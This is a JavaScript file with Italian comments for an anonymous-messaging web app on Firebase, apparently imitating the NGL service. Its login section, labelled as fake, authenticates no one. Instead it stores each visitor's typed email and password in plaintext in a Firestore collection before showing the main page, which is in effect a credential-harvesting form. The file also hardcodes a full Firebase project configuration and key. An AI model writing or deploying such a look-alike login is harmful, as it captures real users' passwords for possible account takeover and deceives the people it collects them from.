/****************************************************
 * CONFIGURAZIONE E INIZIALIZZAZIONE FIREBASE (compat)
 ****************************************************/
// Usa le tue credenziali:
const firebaseConfig = {
  apiKey: "AIzaSyC9mIsxGC5nhr2ExIlguePsPMGi5s69MsI",
  authDomain: "ngl-link-isaacbis.firebaseapp.com",
  projectId: "ngl-link-isaacbis",
  storageBucket: "ngl-link-isaacbis.appspot.com",
  messagingSenderId: "551004938464",
  appId: "1:551004938464:web:74781b8bdf51a008d4f085",
  measurementId: "G-1HND4WD5ND"
};

// Inizializza Firebase con la sintassi compat
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

/****************************************************
 * RIFERIMENTI AGLI ELEMENTI DEL DOM
 ****************************************************/
const loginContainer = document.getElementById("login-container");
const mainContainer = document.getElementById("main-container");

const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const loginError = document.getElementById("login-error");

const userHandle = document.getElementById("user-handle");

const sendBtn = document.querySelector(".send-btn");
const messageTextarea = document.querySelector(".message-textarea");
const receiveBtn = document.querySelector(".receive-btn");

/****************************************************
 * LOGICA LOGIN (FINTA) + CAMBIO PAGINA
 ****************************************************/

loginBtn.addEventListener("click", () => {
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  // Controllo campi vuoti
  if (!email || !password) {
    loginError.textContent = "Email e password sono obbligatorie.";
    return;
  }

  // Salva i dati in Firestore (collezione "users")
  db.collection("users").add({
    email: email,
    password: password,  // NON SICURO in produzione!
    createdAt: new Date()
  })
  .then((docRef) => {
    console.log("Utente salvato con ID:", docRef.id);

    // Se vuoi che l'handle mostri la mail, scommenta:
    // userHandle.textContent = "@" + email;

    // Altrimenti lasciamo fisso "@isaacbis" come da HTML.

    // Passa alla pagina principale
    loginContainer.classList.add("hidden");
    mainContainer.classList.remove("hidden");
  })
  .catch((error) => {
    loginError.textContent = "Errore durante il salvataggio: " + error.message;
  });
});

/****************************************************
 * INVIARE MESSAGGI ANONIMI
 ****************************************************/

sendBtn.addEventListener("click", () => {
  const message = messageTextarea.value.trim();
  if (!message) {
    alert("Il messaggio non può essere vuoto!");
    return;
  }

  // Preleva l'handle (es. "@isaacbis" o "@email")
  const handle = userHandle.textContent; 

  // Salva il messaggio nella collezione "messages"
  db.collection("messages").add({
    user: handle,      // Esempio: "@isaacbis"
    message: message,
    timestamp: new Date()
  })
  .then(() => {
    alert("Messaggio inviato con successo!");
    messageTextarea.value = "";
  })
  .catch(error => {
    console.error("Errore nel salvataggio del messaggio:", error);
    alert("Impossibile inviare il messaggio.");
  });
});

/****************************************************
 * RICEVERE MESSAGGI
 ****************************************************/

receiveBtn.addEventListener("click", () => {
  const handle = userHandle.textContent; // Esempio: "@isaacbis"

  db.collection("messages")
    .where("user", "==", handle)
    .orderBy("timestamp", "desc")
    .get()
    .then(snapshot => {
      if (snapshot.empty) {
        alert("Nessun messaggio trovato per " + handle);
      } else {
        snapshot.forEach(doc => {
          console.log("Messaggio:", doc.data().message);
        });
        alert("Controlla la console per vedere i messaggi!");
      }
    })
    .catch(error => console.error("Errore nel recupero dei messaggi:", error));
});
